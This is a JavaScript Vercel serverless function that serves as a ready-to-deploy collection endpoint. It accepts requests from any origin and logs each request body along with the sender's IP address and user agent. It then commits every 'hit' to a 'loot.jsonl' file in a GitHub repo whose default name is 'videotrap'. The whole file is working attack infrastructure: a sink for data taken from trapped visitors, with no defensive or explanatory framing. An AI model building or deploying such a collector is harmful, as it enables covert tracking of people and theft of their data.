/* Vercel serverless function → appends every hit to loot.jsonl
   in your GitHub repo via the Contents API.
   Env vars needed: GITHUB_TOKEN, GITHUB_REPO  (see README below) */

const FILE_PATH = process.env.GITHUB_FILE || "loot.jsonl";

function cors(res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
}

const GH_HEADERS = {
  Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
  Accept: "application/vnd.github+json",
  "X-GitHub-Api-Version": "2022-11-28"
};

async function getFile(owner, repo) {
  const r = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${FILE_PATH}`, {
    headers: GH_HEADERS
  });
  if (r.status === 404) return null;                  // file doesn't exist yet
  if (!r.ok) throw new Error("GET " + r.status + " " + (await r.text()));
  const j = await r.json();
  return { sha: j.sha, content: Buffer.from(j.content, "base64").toString("utf8") };
}

async function appendToFile(owner, repo, line) {
  // retry loop handles concurrent hits (GitHub returns 409 on sha conflict)
  for (let attempt = 0; attempt < 5; attempt++) {
    const file = await getFile(owner, repo);
    const newContent = (file ? file.content : "") + line + "\n";
    const r = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${FILE_PATH}`, {
      method: "PUT",
      headers: GH_HEADERS,
      body: JSON.stringify({
        message: `hit ${new Date().toISOString()}`,
        content: Buffer.from(newContent, "utf8").toString("base64"),
        sha: file ? file.sha : undefined,
        branch: process.env.GITHUB_BRANCH || "main"
      })
    });
    if (r.status === 409) continue;                   // another write won — retry
    if (!r.ok) throw new Error("PUT " + r.status + " " + (await r.text()));
    return true;
  }
  throw new Error("conflict after 5 retries");
}

module.exports = async function handler(req, res) {
  cors(res);
  if (req.method === "OPTIONS") return res.status(204).end();

  let payload = {};
  try {
    payload = typeof req.body === "string" ? JSON.parse(req.body) : (req.body || {});
  } catch (e) {
    payload = { raw: String(req.body) };
  }

  const entry = {
    ts: new Date().toISOString(),
    srcIP: req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0].trim() : null,
    ua: req.headers["user-agent"] || null,
    payload
  };
  const line = JSON.stringify(entry);
  console.log("[collect]", line);                     // also in Vercel logs

  const [owner, repo] = (process.env.GITHUB_REPO || "youruser/videotrap").split("/");
  try {
    await appendToFile(owner, repo, line);
    res.status(200).json({ ok: true, written: true });
  } catch (e) {
    console.error("[store] failed:", e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
};